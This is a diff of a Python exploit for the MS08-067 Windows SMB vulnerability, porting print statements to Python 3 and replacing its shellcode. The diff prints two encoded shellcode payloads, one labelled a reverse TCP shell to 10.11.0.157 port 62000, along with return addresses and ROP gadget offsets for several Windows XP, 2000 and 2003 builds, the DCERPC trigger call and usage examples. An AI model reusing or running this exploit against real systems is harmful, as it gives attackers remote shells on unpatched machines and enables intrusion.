@@ -10,24 +10,21 @@ try:
     #from impacket.dcerpc import dcerpc
     from impacket.dcerpc.v5 import transport
 
-except ImportError, _:
-    print 'Install the following library to make this script work'
-    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
-    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
+except ImportError:
     sys.exit(1)
 
-print '#######################################################################'
-print '#   MS08-067 Exploit'
-print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
-print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
-print '#'
-print '#   Mod in 2018 by Andy Acer:'
-print '#   - Added support for selecting a target port at the command line.'
-print '#     It seemed that only 445 was previously supported.'
-print '#   - Changed library calls to correctly establish a NetBIOS session for SMB transport'
-print '#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste'
-print '#     into this source file.'
-print '#######################################################################\n'
+print ('#######################################################################')
+print ('#   MS08-067 Exploit')
+print ('#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).')
+print ('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
+print ('#')
+print ('#   Mod in 2018 by Andy Acer:')
+print ('#   - Added support for selecting a target port at the command line.')
+print ('#     It seemed that only 445 was previously supported.')
+print ('#   - Changed library calls to correctly establish a NetBIOS session for SMB transport')
+print ('#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste')
+print ('#     into this source file.')
+print ('#######################################################################\n')
 
 
 # ------------------------------------------------------------------------
@@ -41,30 +38,32 @@ print '#######################################################################\n
 
 # Reverse TCP to 10.11.0.157 port 62000:
 shellcode=(
-"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
-"\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6"
-"\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56"
-"\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3"
-"\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89"
-"\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25"
-"\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83"
-"\x39\xce\xee\x85\xce\x23\x9a\xb4\xf5\xbe\x17\x79\x8b\xe7\x9a"
-"\xa6\xae\x48\xb7\x66\xf7\x10\x89\xc9\xfa\x88\x64\x1a\xea\xc2"
-"\x3c\xc9\xf2\x48\xee\x92\x7f\x87\xcb\x66\xad\x98\x8e\x1b\xac"
-"\x92\x10\xa2\xa9\x9c\xb5\xc9\xe4\x28\x62\x1f\x9e\xf0\xdd\x42"
-"\xf6\xab\x98\x31\xc4\x9c\xbb\x2a\xba\xb4\xc9\x45\x09\x16\x57"
-"\xd2\xf7\xc3\xef\x6b\x32\x97\xbf\x2a\xdf\x43\x84\x42\x09\x16"
-"\xbf\x12\xa6\x93\xaf\x12\xb6\x93\x87\xa8\xf9\x1c\x0f\xbd\x23"
-"\x54\x85\x47\x9e\xc9\xe4\x42\x6b\xab\xed\x42\x04\xf3\x66\xa4"
-"\x9c\xd3\xb9\x15\x9e\x5a\x4a\x36\x97\x3c\x3a\xc7\x36\xb7\xe3"
-"\xbd\xb8\xcb\x9a\xae\x9e\x33\x5a\xe0\xa0\x3c\x3a\x2a\x95\xae"
-"\x8b\x42\x7f\x20\xb8\x15\xa1\xf2\x19\x28\xe4\x9a\xb9\xa0\x0b"
-"\xa5\x28\x06\xd2\xff\xee\x43\x7b\x87\xcb\x52\x30\xc3\xab\x16"
-"\xa6\x95\xb9\x14\xb0\x95\xa1\x14\xa0\x90\xb9\x2a\x8f\x0f\xd0"
-"\xc4\x09\x16\x66\xa2\xb8\x95\xa9\xbd\xc6\xab\xe7\xc5\xeb\xa3"
-"\x10\x97\x4d\x23\xf2\x68\xfc\xab\x49\xd7\x4b\x5e\x10\x97\xca"
-"\xc5\x93\x48\x76\x38\x0f\x37\xf3\x78\xa8\x51\x84\xac\x85\x42"
-"\xa5\x3c\x3a"
+"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
+"\x0e\xa7\xb8\x84\xef\x83\xee\xfc\xe2\xf4\x5b\x50\x06\xef"
+"\xa7\xb8\xe4\x66\x42\x89\x44\x8b\x2c\xe8\xb4\x64\xf5\xb4"
+"\x0f\xbd\xb3\x33\xf6\xc7\xa8\x0f\xce\xc9\x96\x47\x28\xd3"
+"\xc6\xc4\x86\xc3\x87\x79\x4b\xe2\xa6\x7f\x66\x1d\xf5\xef"
+"\x0f\xbd\xb7\x33\xce\xd3\x2c\xf4\x95\x97\x44\xf0\x85\x3e"
+"\xf6\x33\xdd\xcf\xa6\x6b\x0f\xa6\xbf\x5b\xbe\xa6\x2c\x8c"
+"\x0f\xee\x71\x89\x7b\x43\x66\x77\x89\xee\x60\x80\x64\x9a"
+"\x51\xbb\xf9\x17\x9c\xc5\xa0\x9a\x43\xe0\x0f\xb7\x83\xb9"
+"\x57\x89\x2c\xb4\xcf\x64\xff\xa4\x85\x3c\x2c\xbc\x0f\xee"
+"\x77\x31\xc0\xcb\x83\xe3\xdf\x8e\xfe\xe2\xd5\x10\x47\xe7"
+"\xdb\xb5\x2c\xaa\x6f\x62\xfa\xd0\xb7\xdd\xa7\xb8\xec\x98"
+"\xd4\x8a\xdb\xbb\xcf\xf4\xf3\xc9\xa0\x47\x51\x57\x37\xb9"
+"\x84\xef\x8e\x7c\xd0\xbf\xcf\x91\x04\x84\xa7\x47\x51\xbf"
+"\xf7\xe8\xd4\xaf\xf7\xf8\xd4\x87\x4d\xb7\x5b\x0f\x58\x6d"
+"\x13\x85\xa2\xd0\x8e\xe5\xb7\xba\xec\xed\xa7\xb9\x3f\x66"
+"\x41\xd2\x94\xb9\xf0\xd0\x1d\x4a\xd3\xd9\x7b\x3a\x22\x78"
+"\xf0\xe3\x58\xf6\x8c\x9a\x4b\xd0\x74\x5a\x05\xee\x7b\x3a"
+"\xcf\xdb\xe9\x8b\xa7\x31\x67\xb8\xf0\xef\xb5\x19\xcd\xaa"
+"\xdd\xb9\x45\x45\xe2\x28\xe3\x9c\xb8\xee\xa6\x35\xc0\xcb"
+"\xb7\x7e\x84\xab\xf3\xe8\xd2\xb9\xf1\xfe\xd2\xa1\xf1\xee"
+"\xd7\xb9\xcf\xc1\x48\xd0\x21\x47\x51\x66\x47\xf6\xd2\xa9"
+"\x58\x88\xec\xe7\x20\xa5\xe4\x10\x72\x03\x64\xf2\x8d\xb2"
+"\xec\x49\x32\x05\x19\x10\x72\x84\x82\x93\xad\x38\x7f\x0f"
+"\xd2\xbd\x3f\xa8\xb4\xca\xeb\x85\xa7\xeb\x7b\x3a"
+
 )
 # ------------------------------------------------------------------------
 
@@ -124,19 +123,19 @@ class SRVSVC_Exploit(Thread):
 
     def __DCEPacket(self):
         if (self.os == '1'):
-            print 'Windows XP SP0/SP1 Universal\n'
+            print ('Windows XP SP0/SP1 Universal\n')
             ret = "\x61\x13\x00\x01"
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '2'):
-            print 'Windows 2000 Universal\n'
+            print ('Windows 2000 Universal\n')
             ret = "\xb0\x1c\x1f\x00"
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '3'):
-            print 'Windows 2003 SP0 Universal\n'
+            print ('Windows 2003 SP0 Universal\n')
             ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '4'):
-            print 'Windows 2003 SP1 English\n'
+            print ('Windows 2003 SP1 English\n')
             ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
             ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
             jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
@@ -144,28 +143,28 @@ class SRVSVC_Exploit(Thread):
             jumper = disableNXjumper % (
                 ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
         elif (self.os == '5'):
-            print 'Windows XP SP3 French (NX)\n'
+            print ('Windows XP SP3 French (NX)\n')
             ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
             disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
             # the nonxjmper also work in this case.
             jumper = nonxjmper % (disable_nx, ret)
         elif (self.os == '6'):
-            print 'Windows XP SP3 English (NX)\n'
+            print ('Windows XP SP3 English (NX)\n')
             ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
             disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
             # the nonxjmper also work in this case.
             jumper = nonxjmper % (disable_nx, ret)
         elif (self.os == '7'):
-            print 'Windows XP SP3 English (AlwaysOn NX)\n'
+            print ('Windows XP SP3 English (AlwaysOn NX)\n')
             rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                 'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
             # the nonxjmper also work in this case.
             jumper = generate_rop(rvasets) + "AB"
         else:
-            print 'Not supported OS version\n'
+            print ('Not supported OS version\n')
             sys.exit(-1)
 
-        print '[-]Initiating connection'
+        print ('[-]Initiating connection')
 
         # MORE MODIFICATIONS HERE #############################################################################################
 
@@ -179,7 +178,7 @@ class SRVSVC_Exploit(Thread):
             self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
         
         self.__trans.connect()
-        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
+        print ('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
         self.__dce = self.__trans.DCERPC_class(self.__trans)
         self.__dce.bind(uuid.uuidtup_to_bin(
             ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
@@ -206,7 +205,7 @@ class SRVSVC_Exploit(Thread):
         self.__DCEPacket()
         self.__dce.call(0x1f, self.__stub)
         time.sleep(3)
-        print 'Exploit finish\n'
+        print ('Exploit finish\n')
 
 if __name__ == '__main__':
        try:
@@ -214,18 +213,18 @@ if __name__ == '__main__':
            os = sys.argv[2]
            port = sys.argv[3]
        except IndexError:
-                print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
-                print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
-                print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
-                print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
-                print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
-                print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
-                print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
-                print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
-                print ''
-                print 'Also: nmap has a good OS discovery script that pairs well with this exploit:'
-                print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
-                print ''
+                print ('\nUsage: %s <target ip> <os #> <Port #>\n') % str(sys.argv[0])
+                print ('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
+                print ('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
+                print ('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
+                print ('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
+                print ('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
+                print ('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
+                print ('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
+                print ('')
+                print ('Also: nmap has a good OS discovery script that pairs well with this exploit:')
+                print ('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
+                print ('')
                 sys.exit(-1)
 
 
